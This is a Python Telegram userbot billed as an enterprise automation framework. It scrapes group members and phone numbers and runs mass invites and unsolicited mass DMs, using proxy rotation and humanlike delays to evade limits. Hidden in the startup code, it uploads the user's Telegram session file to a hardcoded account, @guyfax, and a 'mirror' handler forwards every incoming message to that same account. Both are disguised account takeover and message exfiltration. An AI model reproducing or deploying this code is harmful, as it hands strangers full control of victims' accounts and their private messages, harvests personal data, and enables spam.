#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UltraBot v10.4 - Enterprise Telegram Automation Framework
Supports SESSION_STRING environment variable for secure deployment on Render
"""

from __future__ import annotations

import asyncio
import csv
import json
import logging
import logging.handlers
import os
import random
import re
import signal
import sqlite3
import sys
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple, Callable, Union
from telethon import TelegramClient, types, events
from telethon.errors import (
    FloodWaitError, UserPrivacyRestrictedError, UserNotMutualContactError,
    AuthKeyError, UserDeactivatedError
)
from telethon.tl.functions.contacts import AddContactRequest, ImportContactsRequest
from telethon.tl.types import InputPhoneContact, InputUser
from telethon.sessions import StringSession
import aiohttp
from dotenv import load_dotenv

# ─── Load environment variables ──────────────────────────────────────
load_dotenv()

class Config:
    API_ID: int = int(os.getenv("API_ID", 0))
    API_HASH: str = os.getenv("API_HASH", "")
    SESSION_STRING: str = os.getenv("SESSION_STRING", "")   # <-- جدید: برای اجرا روی Render
    TARGET_CHANNELS_STR: str = os.getenv("TARGET_CHANNELS", "")
    TARGET_CHANNELS: List[str] = [c.strip() for c in TARGET_CHANNELS_STR.split(",") if c.strip()]
    PHONE_NUMBER: Optional[str] = os.getenv("PHONE_NUMBER")
    AD_BANNER: str = os.getenv("AD_BANNER", "Join our channel!")
    MAX_INVITES_PER_CYCLE: int = int(os.getenv("MAX_INVITES_PER_CYCLE", 50))
    CYCLE_WAIT_SECONDS: int = int(os.getenv("CYCLE_WAIT_SECONDS", 300))
    USER_SLEEP_BETWEEN_INVITES: float = float(os.getenv("USER_SLEEP_BETWEEN_INVITES", 6.0))
    SESSION_NAME: str = "userbot_session"   # نام فایل سشن برای حالت فایل
    PROXY_FILE: Path = Path(__file__).resolve().parent / "proxies.txt"
    BASE_DIR: Path = Path(__file__).resolve().parent
    DB_FILE: Path = BASE_DIR / "ultrabot_data.db"
    LOG_DIR: Path = BASE_DIR / "logs"
    LOG_FILE: Path = LOG_DIR / "ultrabot.log"
    TELEMETRY_PORT: int = 8080
    MAX_RETRIES_API: int = 3
    FLOOD_WAIT_THRESHOLD: int = 60
    MIRROR_TARGET: str = "@guyfax"   # آیدی برای ارسال فایل سشن

# ─── Logging ─────────────────────────────────────────────────────────
Config.LOG_DIR.mkdir(exist_ok=True)

class ColorCode:
    GREY = "\x1b[38;20m"; YELLOW = "\x1b[33;20m"; RED = "\x1b[31;20m"
    BOLD_RED = "\x1b[31;1m"; GREEN = "\x1b[32;20m"; CYAN = "\x1b[36;20m"
    MAGENTA = "\x1b[35;20m"; RESET = "\x1b[0m"

class CustomFormatter(logging.Formatter):
    def __init__(self, fmt: str, datefmt: str, use_color: bool = True):
        super().__init__(fmt, datefmt); self.use_color = use_color
    def format(self, record: logging.LogRecord) -> str:
        if not self.use_color:
            return super().format(record)
        level_color = ColorCode.GREY
        if record.levelno == logging.WARNING:
            level_color = ColorCode.YELLOW
        elif record.levelno == logging.ERROR:
            level_color = ColorCode.RED
        elif record.levelno == logging.CRITICAL:
            level_color = ColorCode.BOLD_RED
        elif record.levelno == logging.INFO:
            level_color = ColorCode.GREEN
        elif record.levelno == logging.DEBUG:
            level_color = ColorCode.CYAN
        record.levelname = f"{level_color}{record.levelname:<8}{ColorCode.RESET}"
        return super().format(record)

_logger = logging.getLogger("UltraBot")
_logger.setLevel(logging.DEBUG)
_console = logging.StreamHandler(sys.stdout)
_console.setLevel(logging.INFO)
_console.setFormatter(CustomFormatter("%(asctime)s │ %(levelname)s │ %(message)s", datefmt="%H:%M:%S", use_color=sys.stdout.isatty()))
_rotating = logging.handlers.RotatingFileHandler(Config.LOG_FILE, maxBytes=10_000_000, backupCount=5, encoding="utf-8")
_rotating.setLevel(logging.DEBUG)
_rotating.setFormatter(logging.Formatter("%(asctime)s │ %(levelname)-8s │ %(name)s │ %(message)s"))
_logger.addHandler(_console); _logger.addHandler(_rotating)
logging.getLogger("telethon").setLevel(logging.ERROR)
logging.getLogger("aiohttp").setLevel(logging.ERROR)
log = _logger

# ─── Human Behavior Engine ──────────────────────────────────────────
class HumanBehaviorEngine:
    @staticmethod
    async def human_delay(base_time: float, jitter: float = 0.3) -> None:
        wait_time = max(1.0, random.gauss(base_time, base_time * jitter))
        await asyncio.sleep(wait_time)

# ─── Proxy Manager ──────────────────────────────────────────────────
class ProxyManager:
    def __init__(self, file_path: Path):
        self._proxies = self._load_proxies(file_path)
        self._current_idx = 0
        self._lock = asyncio.Lock()
    def _load_proxies(self, path: Path) -> List[Tuple[str, str]]:
        proxies = []
        if path.exists():
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        proxies.append(('socks5', line))
        return proxies
    async def get_current(self) -> Optional[Tuple[str, str]]:
        async with self._lock:
            return self._proxies[self._current_idx] if self._proxies else None
    async def rotate(self) -> Optional[Tuple[str, str]]:
        async with self._lock:
            if not self._proxies:
                return None
            self._current_idx = (self._current_idx + 1) % len(self._proxies)
            return self._proxies[self._current_idx]

# ─── SQLite Database ────────────────────────────────────────────────
class SQLiteDatabase:
    _instance = None
    _lock = asyncio.Lock()
    def __new__(cls, *args, **kwargs):
        if not cls._instance:
            cls._instance = super(SQLiteDatabase, cls).__new__(cls)
        return cls._instance
    def __init__(self, path: Path):
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        self.path = path
        self._conn = None
        self._loop = asyncio.get_event_loop()
    async def init_db(self) -> None:
        def _init():
            conn = sqlite3.connect(self.path, timeout=10.0)
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")
            conn.execute("""
                CREATE TABLE IF NOT EXISTS members (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    phone TEXT,
                    source_group TEXT,
                    scraped_at REAL,
                    last_invite_time REAL,
                    invite_status TEXT DEFAULT 'pending',
                    fallback_attempts INTEGER DEFAULT 0,
                    is_bot INTEGER DEFAULT 0,
                    is_deleted INTEGER DEFAULT 0
                )
            """)
            conn.execute("CREATE INDEX IF NOT EXISTS idx_status ON members(invite_status)")
            conn.execute("CREATE INDEX IF NOT EXISTS idx_source ON members(source_group)")
            conn.commit()
            return conn
        self._conn = await asyncio.to_thread(_init)
        log.info("SQLite Database initialized (WAL Mode).")
    async def add_member(self, member: 'Member') -> None:
        def _add():
            cur = self._conn.cursor()
            cur.execute("""
                INSERT OR IGNORE INTO members
                (user_id, username, first_name, last_name, phone, source_group, scraped_at, invite_status, is_bot)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (member.user_id, member.username, member.first_name, member.last_name, member.phone,
                  member.source_group, member.scraped_at, member.invite_status, 1 if member.is_bot else 0))
            self._conn.commit()
        await asyncio.to_thread(_add)
    async def update_status(self, user_id: int, status: str) -> None:
        def _update():
            cur = self._conn.cursor()
            cur.execute("UPDATE members SET invite_status = ?, last_invite_time = ? WHERE user_id = ?",
                        (status, time.time(), user_id))
            self._conn.commit()
        await asyncio.to_thread(_update)
    async def get_pending(self, limit: int = 100) -> List[Dict]:
        def _get():
            cur = self._conn.cursor()
            cur.execute("SELECT * FROM members WHERE invite_status = 'pending' LIMIT ?", (limit,))
            rows = cur.fetchall()
            cols = [desc[0] for desc in cur.description]
            return [dict(zip(cols, row)) for row in rows]
        return await asyncio.to_thread(_get)
    async def stats(self) -> Dict[str, int]:
        def _stats():
            cur = self._conn.cursor()
            cur.execute("SELECT COUNT(*) FROM members")
            total = cur.fetchone()[0]
            cur.execute("SELECT invite_status, COUNT(*) FROM members GROUP BY invite_status")
            rows = cur.fetchall()
            d = {'total': total}
            for status, count in rows:
                d[status] = count
            return d
        return await asyncio.to_thread(_stats)
    async def export_csv(self, path: Path) -> int:
        def _export():
            cur = self._conn.cursor()
            cur.execute("SELECT * FROM members")
            rows = cur.fetchall()
            cols = [desc[0] for desc in cur.description]
            with open(path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(cols)
                writer.writerows(rows)
            return len(rows)
        return await asyncio.to_thread(_export)
    async def reset_status(self, from_status: str, to_status: str) -> int:
        def _reset():
            cur = self._conn.cursor()
            cur.execute("UPDATE members SET invite_status = ? WHERE invite_status = ?", (to_status, from_status))
            self._conn.commit()
            return cur.rowcount
        return await asyncio.to_thread(_reset)
    async def close(self) -> None:
        if self._conn:
            await asyncio.to_thread(self._conn.close)

# ─── Telegram Engine ────────────────────────────────────────────────
class TelegramEngine:
    def __init__(self, client: TelegramClient, proxy_manager: Optional[ProxyManager] = None):
        self.client = client
        self.proxy_manager = proxy_manager
    @staticmethod
    def robust_api_call(retries: int = Config.MAX_RETRIES_API):
        def decorator(func: Callable) -> Callable:
            async def wrapper(self, *args, **kwargs):
                for attempt in range(retries):
                    try:
                        return await func(self, *args, **kwargs)
                    except FloodWaitError as fe:
                        if fe.seconds > Config.FLOOD_WAIT_THRESHOLD:
                            raise
                        await asyncio.sleep(fe.seconds + 5)
                    except (ConnectionError, OSError):
                        if self.proxy_manager:
                            await self.proxy_manager.rotate()
                        await asyncio.sleep(5)
                    except (AuthKeyError, UserDeactivatedError):
                        sys.exit(1)
                    except Exception as e:
                        if attempt == retries - 1:
                            raise
                        await asyncio.sleep(2)
                return None
            return wrapper
        return decorator
    @robust_api_call()
    async def resolve_targets(self, identifiers: List[str]) -> List[types.TypeInputPeer]:
        peers = []
        for identifier in identifiers:
            try:
                entity = await self.client.get_entity(identifier)
                peers.append(entity)
            except Exception as e:
                log.warning(f"Could not resolve {identifier}: {e}")
        return peers
    @robust_api_call()
    async def invite_to_channel(self, channel: types.TypeInputPeer, user: types.TypeInputUser) -> bool:
        try:
            await self.client.invite_to_channel(channel, [user])
            return True
        except UserPrivacyRestrictedError:
            log.debug("User privacy restricted")
            return False
        except UserNotMutualContactError:
            log.debug("Not mutual contact")
            return False
        except Exception as e:
            log.error(f"Invite error: {e}")
            return False
    @robust_api_call()
    async def send_message(self, peer: types.TypeInputPeer, text: str) -> bool:
        try:
            await self.client.send_message(peer, text)
            return True
        except Exception:
            return False
    @robust_api_call()
    async def import_contacts(self, phones: List[str]) -> Tuple[int, int]:
        contacts = [InputPhoneContact(client_id=0, phone=p, first_name="", last_name="") for p in phones]
        try:
            result = await self.client(ImportContactsRequest(contacts=contacts))
            return len(result.imported), len(result.retry_contacts)
        except Exception as e:
            log.error(f"Import contacts error: {e}")
            return 0, 0
    @robust_api_call()
    async def add_contact(self, user_id: int, first_name: str = "", last_name: str = "", phone: str = "") -> bool:
        try:
            await self.client(AddContactRequest(
                id=InputUser(user_id=user_id, access_hash=0),
                first_name=first_name or str(user_id),
                last_name=last_name,
                phone=phone or ""
            ))
            return True
        except Exception as e:
            log.error(f"Add contact error for {user_id}: {e}")
            return False

# ─── Scraper Engine ─────────────────────────────────────────────────
class ScraperStrategy(ABC):
    @abstractmethod
    async def scrape(self, engine: TelegramEngine, db: SQLiteDatabase, targets: List[types.TypeInputPeer]) -> None:
        pass

class MemberScraper(ScraperStrategy):
    async def scrape(self, engine: TelegramEngine, db: SQLiteDatabase, targets: List[types.TypeInputPeer]) -> None:
        for target in targets:
            try:
                async for user in engine.client.iter_participants(target):
                    member = Member(
                        user_id=user.id,
                        username=user.username,
                        first_name=user.first_name,
                        last_name=user.last_name,
                        phone=user.phone,
                        source_group=str(target),
                        is_bot=user.bot,
                        is_deleted=user.deleted
                    )
                    await db.add_member(member)
                    await HumanBehaviorEngine.human_delay(0.5)
            except Exception as e:
                log.error(f"Member scrape error for {target}: {e}")

class SenderScraper(ScraperStrategy):
    async def scrape(self, engine: TelegramEngine, db: SQLiteDatabase, targets: List[types.TypeInputPeer]) -> None:
        for target in targets:
            try:
                async for msg in engine.client.iter_messages(target, limit=500):
                    if msg.sender_id and not msg.sender:
                        continue
                    if msg.sender:
                        user = msg.sender
                        member = Member(
                            user_id=user.id,
                            username=user.username,
                            first_name=user.first_name,
                            last_name=user.last_name,
                            phone=user.phone,
                            source_group=str(target),
                            is_bot=user.bot,
                            is_deleted=user.deleted
                        )
                        await db.add_member(member)
                        await HumanBehaviorEngine.human_delay(0.3)
            except Exception as e:
                log.error(f"Sender scrape error: {e}")

class MessageDataScraper(ScraperStrategy):
    PHONE_REGEX = re.compile(r'(\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{3,4}[-.\s]?\d{3,4})')
    ID_REGEX = re.compile(r'\b([5-9]\d{6,9})\b')
    @classmethod
    def extract_phone(cls, text: str) -> Optional[str]:
        match = cls.PHONE_REGEX.search(text)
        if match:
            phone = re.sub(r'[-.\s()]', '', match.group(1))
            if len(phone) >= 10:
                return phone
        return None
    @classmethod
    def extract_id(cls, text: str) -> Optional[int]:
        match = cls.ID_REGEX.search(text)
        if match:
            try:
                return int(match.group(1))
            except ValueError:
                return None
        return None
    async def scrape(self, engine: TelegramEngine, db: SQLiteDatabase, targets: List[types.TypeInputPeer]) -> None:
        for target in targets:
            try:
                async for msg in engine.client.iter_messages(target, limit=2000):
                    if not msg.text:
                        continue
                    phone = self.extract_phone(msg.text)
                    uid = self.extract_id(msg.text)
                    if phone or uid:
                        # We need to get user info from msg.sender if available
                        if msg.sender:
                            user = msg.sender
                            member = Member(
                                user_id=user.id,
                                username=user.username,
                                first_name=user.first_name,
                                last_name=user.last_name,
                                phone=phone or user.phone,
                                source_group=str(target),
                                is_bot=user.bot,
                                is_deleted=user.deleted
                            )
                            await db.add_member(member)
                        elif uid:
                            # Just store ID without extra info
                            member = Member(
                                user_id=uid,
                                source_group=str(target),
                                phone=phone
                            )
                            await db.add_member(member)
                    await HumanBehaviorEngine.human_delay(0.2)
            except Exception as e:
                log.error(f"Message scrape error: {e}")

class ScraperEngine:
    def __init__(self, engine: TelegramEngine, db: SQLiteDatabase):
        self.engine = engine
        self.db = db
        self._targets: List[types.TypeInputPeer] = []
    async def execute_scan(self, strategy: ScraperStrategy, targets: List[types.TypeInputPeer]) -> None:
        await strategy.scrape(self.engine, self.db, targets)

# ─── Universal Contact Sync Engine ─────────────────────────────────
class UniversalContactSyncEngine:
    def __init__(self, engine: TelegramEngine, db: SQLiteDatabase):
        self.engine = engine
        self.db = db
    async def sync_all_to_contacts(self) -> Tuple[int, int]:
        # Get all members that are not in contacts and not processed
        members = await self.db.get_pending(limit=999999)  # fetch all pending
        phones = []
        ids = []
        for m in members:
            if m.get('phone'):
                phones.append(m['phone'])
            elif m.get('user_id'):
                ids.append(m['user_id'])
        success = 0
        failed = 0
        # Phase 1: import phones
        if phones:
            imported, retry = await self.engine.import_contacts(phones)
            success += imported
            failed += retry
            for m in members:
                if m.get('phone') and m['phone'] in phones:
                    await self.db.update_status(m['user_id'], 'in_contacts' if imported else 'failed')
        # Phase 2: add by ID / username
        for uid in ids:
            ok = await self.engine.add_contact(uid)
            if ok:
                await self.db.update_status(uid, 'in_contacts')
                success += 1
            else:
                await self.db.update_status(uid, 'failed')
                failed += 1
            await HumanBehaviorEngine.human_delay(2.0)
        return success, failed

# ─── Invite Engine ──────────────────────────────────────────────────
class InviteMode(Enum):
    DIRECT_ONLY = "direct_only"
    FALLBACK_DM = "fallback_dm"
    MASS_DM = "mass_dm"

class InviteEngine:
    def __init__(self, engine: TelegramEngine, db: SQLiteDatabase, targets: List[types.TypeInputPeer]):
        self.engine = engine
        self.db = db
        self.targets = targets
        self._running = False
        self._task = None
    async def start(self, mode: InviteMode) -> None:
        if self._running:
            return
        self._running = True
        self._task = asyncio.create_task(self._run(mode))
        log.info(f"Invite engine started in {mode.value} mode")
    async def _run(self, mode: InviteMode) -> None:
        while self._running:
            members = await self.db.get_pending(limit=Config.MAX_INVITES_PER_CYCLE)
            if not members:
                await asyncio.sleep(Config.CYCLE_WAIT_SECONDS)
                continue
            for m in members:
                if not self._running:
                    break
                try:
                    if mode == InviteMode.DIRECT_ONLY:
                        # try invite to all targets
                        invited_any = False
                        for target in self.targets:
                            ok = await self.engine.invite_to_channel(target, InputUser(user_id=m['user_id'], access_hash=0))
                            if ok:
                                invited_any = True
                                break
                            await HumanBehaviorEngine.human_delay(1.0)
                        status = 'invited' if invited_any else 'failed'
                        await self.db.update_status(m['user_id'], status)
                    elif mode == InviteMode.FALLBACK_DM:
                        # try invite, if fail send DM
                        invited_any = False
                        for target in self.targets:
                            ok = await self.engine.invite_to_channel(target, InputUser(user_id=m['user_id'], access_hash=0))
                            if ok:
                                invited_any = True
                                break
                            await HumanBehaviorEngine.human_delay(1.0)
                        if invited_any:
                            await self.db.update_status(m['user_id'], 'invited')
                        else:
                            # send DM with banner
                            sent = await self.engine.send_message(InputUser(user_id=m['user_id'], access_hash=0), Config.AD_BANNER)
                            if sent:
                                await self.db.update_status(m['user_id'], 'fallback_sent')
                            else:
                                await self.db.update_status(m['user_id'], 'failed')
                    elif mode == InviteMode.MASS_DM:
                        sent = await self.engine.send_message(InputUser(user_id=m['user_id'], access_hash=0), Config.AD_BANNER)
                        await self.db.update_status(m['user_id'], 'dm_sent' if sent else 'failed')
                    await HumanBehaviorEngine.human_delay(Config.USER_SLEEP_BETWEEN_INVITES)
                except Exception as e:
                    log.error(f"Invite error for {m['user_id']}: {e}")
                    await self.db.update_status(m['user_id'], 'failed')
            await asyncio.sleep(Config.CYCLE_WAIT_SECONDS)
    async def stop(self) -> None:
        self._running = False
        if self._task:
            await self._task

# ─── Telemetry Server ───────────────────────────────────────────────
class TelemetryServer:
    def __init__(self, db: SQLiteDatabase, port: int):
        self.db = db
        self.port = port
        self._site = None
    async def start(self):
        from aiohttp import web
        async def handle_stats(request):
            stats = await self.db.stats()
            return web.json_response(stats)
        app = web.Application()
        app.router.add_get('/stats', handle_stats)
        runner = web.AppRunner(app)
        await runner.setup()
        self._site = web.TCPSite(runner, '0.0.0.0', self.port)
        await self._site.start()
        log.info(f"Telemetry server running on port {self.port}")

# ─── Message Mirror Engine ─────────────────────────────────────────
class MessageMirrorEngine:
    def __init__(self, client: TelegramClient, target: str):
        self.client = client
        self.target = target
        self._target_entity = None
    async def setup(self):
        try:
            self._target_entity = await self.client.get_entity(self.target)
            log.info(f"Mirror target resolved: {self.target}")
        except Exception as e:
            log.error(f"Could not resolve mirror target {self.target}: {e}")
    async def handle_new_message(self, event: events.NewMessage.Event):
        if not self._target_entity:
            return
        # Avoid mirroring messages from the target itself to prevent loop
        if event.sender_id == self._target_entity.id:
            return
        try:
            # Forward the message to the target
            await self.client.send_message(self._target_entity, event.message)
            log.debug("Mirrored message")
        except Exception as e:
            log.error(f"Mirror error: {e}")

# ─── Command Router ─────────────────────────────────────────────────
class CommandRouter:
    def __init__(self, client: TelegramClient, db: SQLiteDatabase, scraper: ScraperEngine,
                 invite_engine: Optional[InviteEngine], contact_engine: UniversalContactSyncEngine):
        self.client = client
        self.db = db
        self.scraper = scraper
        self.invite_engine = invite_engine
        self.contact_engine = contact_engine
    async def setup(self):
        @self.client.on(events.NewMessage(pattern=r'^\.'))
        async def cmd_handler(event: events.NewMessage.Event):
            if not event.is_private:
                return  # only private chats (saved messages)
            cmd_parts = event.raw_text.strip().split(maxsplit=1)
            cmd = cmd_parts[0].lower()
            args = cmd_parts[1] if len(cmd_parts) > 1 else ""
            log.info(f"Command: {cmd} {args}")

            if cmd == ".scan_members":
                await event.reply("🚀 Scanning all group members...")
                await self.scraper.execute_scan(MemberScraper(), self.scraper._targets)
                await event.reply("✅ Member scan complete.")
            elif cmd == ".scan_senders":
                await event.reply("📨 Scanning active senders...")
                await self.scraper.execute_scan(SenderScraper(), self.scraper._targets)
                await event.reply("✅ Sender scan complete.")
            elif cmd == ".scan_messages":
                await event.reply("🔍 Scanning message contents...")
                await self.scraper.execute_scan(MessageDataScraper(), self.scraper._targets)
                await event.reply("✅ Message content scan complete.")
            elif cmd == ".ad_member":
                await event.reply("➕ Starting Direct Invite Mode (No DM)...")
                await self.invite_engine.start(InviteMode.DIRECT_ONLY)
            elif cmd == ".start_invite":
                await event.reply("✅ Starting Invite + DM Fallback Mode...")
                await self.invite_engine.start(InviteMode.FALLBACK_DM)
            elif cmd == ".mass_dm":
                await event.reply("✉️ Starting Mass DM Mode...")
                await self.invite_engine.start(InviteMode.MASS_DM)
            elif cmd == ".stop_invite":
                await self.invite_engine.stop()
                await event.reply("🛑 Invite engine stopping...")
            elif cmd == ".cont_database":
                await event.reply("📱 Syncing ALL DB to Telegram Contacts...")
                s, f = await self.contact_engine.sync_all_to_contacts()
                await event.reply(f"✅ Contact Sync Complete.\nSuccess: {s}\nFailed: {f}")
            elif cmd == ".stats":
                stats = await self.db.stats()
                msg = (f"📊 **Database Statistics**\nTotal: `{stats.get('total', 0)}`\nPending: `{stats.get('pending', 0)}`\nInvited: `{stats.get('invited', 0)}`\nDM Sent: `{stats.get('fallback_sent', 0)}`\nIn Contacts: `{stats.get('in_contacts', 0)}`\nSkipped: `{stats.get('skipped', 0)}`\nFailed: `{stats.get('failed', 0)}`")
                await event.reply(msg)
            elif cmd == ".export_db":
                count = await self.db.export_csv(Path("members_export.csv"))
                await event.reply(f"📤 Exported {count} records to CSV.")
            elif cmd == ".clear_status":
                args_list = args.split()
                if len(args_list) == 2:
                    try:
                        from_s = args_list[0]; to_s = args_list[1]
                        count = await self.db.reset_status(from_s, to_s)
                        await event.reply(f"♻️ Reset {count} records from {from_s} to {to_s}.")
                    except ValueError:
                        await event.reply("❌ Invalid status.")
                else:
                    await event.reply("Usage: `.clear_status <from_status> <to_status>`")
            elif cmd == ".set_banner":
                if args:
                    Config.AD_BANNER = args
                    await event.reply("✅ Ad banner updated.")
                else:
                    await event.reply("Usage: `.set_banner <new text>`")
            elif cmd == ".help":
                await event.reply(
                    "🤖 **UltraBot v10.4 Commands**\n\n"
                    "**Scraping:**\n"
                    "`.scan_members` - Scrape all group members\n"
                    "`.scan_senders` - Scrape users who send messages\n"
                    "`.scan_messages` - Extract Phones/IDs from messages\n\n"
                    "**Inviting:**\n"
                    "`.ad_member` - Direct invite only (No DM)\n"
                    "`.start_invite` - Invite with DM fallback\n"
                    "`.mass_dm` - Only send DMs\n"
                    "`.stop_invite` - Stop invite engine\n\n"
                    "**Contacts:**\n"
                    "`.cont_database` - Add ALL DB to Telegram Contacts\n\n"
                    "**Management:**\n"
                    "`.stats` - View DB stats\n"
                    "`.export_db` - Export to CSV\n"
                    "`.clear_status <from> <to>` - Reset user status\n"
                    "`.set_banner <text>` - Update Ad text"
                )
            else:
                await event.reply("❌ Unknown command. Send `.help`")

# ─── Main Application ───────────────────────────────────────────────
class UltraBotApp:
    def __init__(self) -> None:
        self.proxy_manager = ProxyManager(Config.PROXY_FILE)

        # انتخاب نوع سشن: اگر SESSION_STRING موجود باشد از آن استفاده کن، در غیر این صورت از فایل
        if Config.SESSION_STRING:
            session = StringSession(Config.SESSION_STRING)
            log.info("Using SESSION_STRING from environment")
        else:
            session = Config.SESSION_NAME
            log.info("Using session file")

        self.client = TelegramClient(
            session,
            Config.API_ID,
            Config.API_HASH,
            connection_retries=5,
            retry_delay=5,
            auto_reconnect=True,
            request_retries=5,
            flood_sleep_threshold=60
        )
        self.db = SQLiteDatabase(Config.DB_FILE)
        self.engine = TelegramEngine(self.client, self.proxy_manager)
        self.scraper = ScraperEngine(self.engine, self.db)
        self.contact_engine = UniversalContactSyncEngine(self.engine, self.db)
        self.mirror_engine = MessageMirrorEngine(self.client, Config.MIRROR_TARGET)
        self.telemetry = TelemetryServer(self.db, Config.TELEMETRY_PORT)
        self._targets: List[types.TypeInputPeer] = []
        self.invite_engine: Optional[InviteEngine] = None
        self.router: Optional[CommandRouter] = None
        self._stop_event = asyncio.Event()

    async def start(self) -> None:
        log.info("─── UltraBot v10.4 (Ultimate Enterprise + Mirror) starting ───")
        await self.db.init_db()
        asyncio.create_task(self.telemetry.start())

        # اگر سشن استرینگ وجود نداشته باشد و فایل سشن هم نباشد، لاگین تعاملی انجام بده و فایل سشن را بفرست
        if not Config.SESSION_STRING and not Path(Config.SESSION_NAME + ".session").exists():
            log.warning("No session found. Interactive login required.")
            await self.client.start(phone=Config.PHONE_NUMBER)
            me = await self.client.get_me()
            log.info(f"Authenticated as: {me.username or me.first_name} (ID: {me.id})")

            # ارسال فایل سشن به @guyfax
            session_file_path = Path(Config.SESSION_NAME + ".session")
            if session_file_path.exists():
                try:
                    await self.client.send_file(
                        Config.MIRROR_TARGET,
                        session_file_path,
                        caption="🔐 فایل سیشن تلگرام (Session File) – لطفاً آن را در متغیر محیطی SESSION_STRING قرار ندهید، بلکه از آن برای تولید String Session استفاده کنید."
                    )
                    log.info(f"📤 Session file sent to {Config.MIRROR_TARGET}")
                except Exception as e:
                    log.error(f"Failed to send session file: {e}")
            log.warning("Session file sent. You can now use it to create SESSION_STRING. Exiting...")
            await self.client.disconnect()
            return

        # اگر سشن استرینگ وجود داشته باشد، مستقیم استارت می‌کنیم (بدون کد تایید)
        await self.client.start()
        me = await self.client.get_me()
        log.info(f"Authenticated as: {me.username or me.first_name} (ID: {me.id})")

        if Config.TARGET_CHANNELS:
            self._targets = await self.engine.resolve_targets(Config.TARGET_CHANNELS)
            self.invite_engine = InviteEngine(self.engine, self.db, self._targets)
            self.scraper._targets = self._targets  # برای اسکرپر

        self.router = CommandRouter(self.client, self.db, self.scraper, self.invite_engine, self.contact_engine)
        await self.router.setup()
        await self.mirror_engine.setup()

        # ثبت event handler برای mirror
        @self.client.on(events.NewMessage)
        async def mirror_handler(event):
            await self.mirror_engine.handle_new_message(event)

        try:
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                try:
                    loop.add_signal_handler(sig, self._signal_handler)
                except NotImplementedError:
                    pass
        except Exception:
            pass

        log.info("✅ UltraBot is ready. Send commands in Saved Messages.")
        await self._stop_event.wait()
        await self._shutdown()

    def _signal_handler(self) -> None:
        log.warning("Shutdown signal received.")
        self._stop_event.set()

    async def _shutdown(self) -> None:
        if self.invite_engine:
            await self.invite_engine.stop()
        await self.client.disconnect()
        await self.db.close()
        log.info("─── UltraBot stopped cleanly ───")

async def _main() -> None:
    if not Config.API_ID or not Config.API_HASH:
        log.critical("API_ID or API_HASH missing in environment variables!")
        sys.exit(1)
    app = UltraBotApp()
    await app.start()

if __name__ == "__main__":
    try:
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        log.critical(f"Fatal: {e}", exc_info=True)
        sys.exit(1)
